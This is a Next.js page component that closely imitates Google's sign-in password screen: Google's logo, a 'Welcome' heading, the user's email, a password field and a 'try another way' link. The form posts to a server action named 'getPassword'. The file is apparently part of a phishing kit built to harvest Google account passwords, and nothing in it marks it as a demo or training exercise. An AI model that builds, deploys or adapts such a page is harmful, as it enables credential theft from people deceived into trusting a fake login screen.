import { getPassword } from "@/actions";
import PasswordFill from "@/components/PasswordFill";
import PasswordFillSubmission from "@/components/PasswordFillSubmission";
import ShowcaseEmail from "@/components/ShowcaseEmail";

export default function Page() {
  return (
    <div className="flex   overflow-hidden relative flex-col bg-white text-black p-5 h-screen">
      <form action={getPassword}>
        <svg
          xmlns="https://www.w3.org/2000/svg"
          width="48"
          height="48"
          viewBox="0 0 48 48"
          aria-hidden="true"
          jsname="jjf7Ff"
        >
          <path
            fill="#4285F4"
            d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"
          ></path>
          <path
            fill="#34A853"
            d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"
          ></path>
          <path
            fill="#FBBC05"
            d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"
          ></path>
          <path
            fill="#EA4335"
            d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"
          ></path>
          <path fill="none" d="M2 2h44v44H2z"></path>
        </svg>
        <div>
          <h1 className="text-3xl py-3">Welcome</h1>
          <div>
            <div className="inline-flex gap-3 items-center p-1  rounded-3xl border  ">
              <svg
                aria-hidden="true"
                fill="currentColor"
                focusable="false"
                width="38px"
                height="38px"
                viewBox="0 0 24 24"
                xmlns="https://www.w3.org/2000/svg"
              >
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
              </svg>

              <ShowcaseEmail />
              <svg
                aria-hidden="true"
                fill="currentColor"
                focusable="false"
                width="24px"
                height="24px"
                viewBox="0 0 24 24"
                xmlns="https://www.w3.org/2000/svg"
              >
                <path d="M7 10l5 5 5-5z"></path>
              </svg>
            </div>
          </div>

          <PasswordFill />
        </div>
        <div className="flex pt-10 justify-between  items-center mt-5">
          <a className="text-blue-600" href="#">
            {" "}
            try another way
          </a>
          <PasswordFillSubmission />
        </div>

        <div className="flex w-full justify-between absolute bottom-2 left-0 items-center gap-3 p-5 ">
          <span className=" text-nowrap">English (United States) </span>
          <div className="flex gap-3">
            <span>Help</span>
            <span>Privacy</span>
            <span>Team</span>
          </div>
        </div>
      </form>
    </div>
  );
}
